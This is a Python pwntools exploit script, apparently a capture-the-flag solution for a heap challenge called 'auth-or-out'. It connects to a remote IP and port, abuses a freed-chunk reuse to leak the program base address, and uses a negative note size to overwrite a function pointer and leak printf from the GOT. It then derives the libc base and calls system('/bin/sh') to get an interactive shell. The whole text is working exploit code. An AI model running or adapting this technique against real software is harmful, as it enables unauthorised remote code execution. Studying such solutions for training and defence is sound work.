#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./auth-or-out_patched',checksec=False)
libc = ELF('./libc.so.6')
#p = process()
p = remote('83.136.252.206',42682)

#gdb.attach(p,gdbscript='''
  #         set follow-fork-mode child
 #           brva 0x000000000000143D
  #         brva 0x000000000000156F
#           brva 0x0000000000001849
 #          brva 0x0000000000001753
 #          brva 0x000000000000190C
   #        ''')

def add(name,surname,age,note_size=0,note=b''):
    
    p.sendlineafter(b'Choice: ', b'1')

    p.sendlineafter(b'Name: ', name)

    p.sendlineafter(b'Surname: ', surname)

    p.sendlineafter(b'Age: ', str(age).encode())
    p.sendlineafter(b'Author Note size: ', str(note_size).encode())

    if note_size:
        p.sendlineafter(b'Note: ',note)

def modify(id, name, surname, age):
    p.sendlineafter(b'Choice: ', b'2')
    p.sendlineafter(b'ID: ', str(id).encode())
    p.sendafter(b'Name: ', name)
    p.sendlineafter(b'Surname: ', surname)
    p.sendlineafter(b'Age: ', str(age).encode())
def view(id):
    p.sendlineafter(b'Choice: ', b'3')
    p.sendlineafter(b'ID: ', str(id).encode())

def delete(id):
    p.sendlineafter(b'Choice: ', b'4')
    p.sendlineafter(b'ID: ', str(id).encode())

add(b'a',b'a',0)
add(b'b',b'b',1)

delete(1)
delete(2)

add(b'c',b'c',3,48,b'a'*0x30)
view(1)
leak = p.recvuntil(b']')
exe.address = u64(leak[-7:-1].ljust(8,b'\x00'))

exe.address = exe.address - 0x1219
log.info(f'exe: {hex(exe.address)}')

add(b'd',b'd',4)
delete(1)
payload = b'a'*88
payload += p64(exe.got.printf)
payload += b'a'*8 + p64(exe.plt.puts)
add(b'e',b'e',5,-1,payload)
view(2)
p.recvuntil(b'Age: ')
p.recvline()
leak = u64(p.recv(6).ljust(8,b'\x00'))
log.info(f'printf_got: {hex(leak)}')
libc.address = leak - libc.sym.printf
log.info(f'libc: {hex(libc.address)}')

input()
delete(1)
payload = b'a'*88
payload += p64(next(libc.search(b'/bin/sh\x00')))
payload += b'a'*8 + p64(libc.sym.system)
add(b'b','b',6,-1,payload)

view(2)


p.interactive()
